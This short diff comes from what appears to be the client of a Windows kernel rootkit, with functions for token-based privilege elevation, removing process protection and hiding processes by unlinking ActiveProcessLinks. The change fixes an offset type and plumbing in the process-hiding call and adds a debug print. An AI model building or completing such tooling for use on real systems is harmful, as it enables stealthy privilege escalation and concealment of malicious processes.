@@ -84,7 +84,7 @@ struct elevateProcArgs {
 
 struct hideProcArgs {
     DWORD pid;
-    int offset;
+    DWORD offset;
 };
 
 
@@ -234,6 +234,7 @@ offsets getOffsetByBuild(void) {
 	
 	off.ProtectionOffset = ProtectionOffset;
 	off.tokenOffset = tokenOffset;
+	off.ActiveProcessLinks = ActiveProcessLinks;
 
     return off;
 }
@@ -855,6 +856,9 @@ BOOL hideProc(HANDLE hDevice, DWORD pid) {
 	hideProcArgs data;
 	data.pid = pid;
 	data.offset = off.ActiveProcessLinks;
+
+	printf("Using ActiveProcessLinks offset: 0x%lx\n", data.offset);
+
 
 
     result = DeviceIoControl(
